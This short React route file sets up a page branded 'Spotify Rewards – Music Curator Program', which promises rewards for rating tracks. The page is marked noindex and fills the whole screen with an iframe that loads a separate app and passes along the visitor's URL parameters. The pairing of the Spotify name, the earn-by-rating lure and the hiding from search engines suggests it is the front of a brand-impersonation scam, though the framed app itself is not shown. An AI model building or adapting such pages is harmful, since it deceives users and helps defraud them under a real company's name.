import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useState } from "react";

export const Route = createFileRoute("/")({
  head: () => ({
    meta: [
      { title: "Spotify Rewards – Music Curator Program" },
      { name: "description", content: "Certified music reviewer portal. Rate tracks and earn rewards." },
      { name: "robots", content: "noindex, nofollow" },
      { property: "og:title", content: "Spotify Rewards – Music Curator Program" },
      { property: "og:description", content: "Certified music reviewer portal. Rate tracks and earn rewards." },
    ],
  }),
  component: Index,
});

function Index() {
  const [iframeSrc, setIframeSrc] = useState("/sp/app/app.html");

  useEffect(() => {
    if (typeof window !== "undefined") {
      setIframeSrc(`/sp/app/app.html${window.location.search}`);
    }
  }, []);

  return (
    <iframe
      src={iframeSrc}
      title="Spotify Rewards"
      style={{
        position: "fixed",
        inset: 0,
        width: "100%",
        height: "100%",
        border: "none",
      }}
      allow="autoplay"
    />
  );
}
